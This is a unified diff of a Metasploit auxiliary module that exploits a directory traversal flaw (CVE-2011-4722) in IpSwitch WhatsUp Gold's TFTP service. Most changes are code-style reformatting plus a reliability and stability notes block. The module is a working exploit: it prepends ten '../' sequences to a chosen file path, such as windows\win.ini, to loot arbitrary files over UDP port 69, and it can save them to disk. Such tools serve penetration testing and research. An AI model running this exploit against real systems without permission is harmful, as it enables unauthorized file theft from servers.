@@ -7,42 +7,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "IpSwitch WhatsUp Gold TFTP Directory Traversal",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "IpSwitch WhatsUp Gold TFTP Directory Traversal",
+        'Description' => %q{
           This modules exploits a directory traversal vulnerability in IpSwitch WhatsUp
-        Gold's TFTP service.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Prabhu S Angadi',  # Initial discovery and poc
+          Gold's TFTP service.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Prabhu S Angadi', # Initial discovery and poc
           'sinn3r',           # Metasploit module
           'juan vazquez'      # More improvements
         ],
-      'References'     =>
-        [
+        'References' => [
           ['OSVDB', '77455'],
           ['BID', '50890'],
           ['EDB', '18189'],
           ['URL', 'http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt'],
           ['CVE', '2011-4722']
         ],
-      'DisclosureDate' => '2011-12-12'
-    ))
+        'DisclosureDate' => '2011-12-12',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(69),
         OptString.new('FILENAME', [false, 'The file to loot', 'windows\\win.ini']),
         OptBool.new('SAVE', [false, 'Save the downloaded file to disk', false])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
     # Prepare the filename
-    file_name  = "../"*10
+    file_name = "../" * 10
     file_name << datastore['FILENAME']
 
     # Prepare the packet
@@ -55,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
     # We need to reuse the same port in order to receive the data
     udp_sock = Rex::Socket::Udp.create(
       {
-        'Context' => {'Msf' => framework, 'MsfExploit'=>self}
+        'Context' => { 'Msf' => framework, 'MsfExploit' => self }
       }
     )
 
@@ -78,8 +85,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if file_data.empty?
-        print_error("Error retrieving file #{file_name} from #{ip}")
-        return
+      print_error("Error retrieving file #{file_name} from #{ip}")
+      return
     end
 
     udp_sock.close
@@ -102,11 +109,9 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Returns an Acknowledgement
   #
-  def tftp_ack(block=1)
-
+  def tftp_ack(block = 1)
     pkt = "\x00\x04" # Ack
     pkt << [block].pack("n") # Block Id
-
   end
 end
 
